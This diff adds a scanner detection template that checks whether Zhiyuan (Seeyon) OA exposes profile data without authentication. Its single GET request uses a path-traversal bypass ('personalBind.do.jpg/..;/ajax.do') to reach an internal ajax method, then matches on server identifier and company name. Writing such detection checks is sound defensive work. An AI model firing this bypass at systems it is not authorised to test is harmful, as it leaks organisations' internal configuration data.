@@ -1,0 +1,31 @@
+id: zhiyuan-oa-unauthorized
+brief:
+    title: Zhiyuan Oa Unauthorized
+    by: pikpikcu
+    level: low
+    about: Zhiyuan Oa is exposed.
+    label:
+        - seeyon
+        - unauth
+        - zhiyuan
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile'
+      signs:
+        - "on": word
+          has:
+            - serverIdentifier
+            - companyName
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
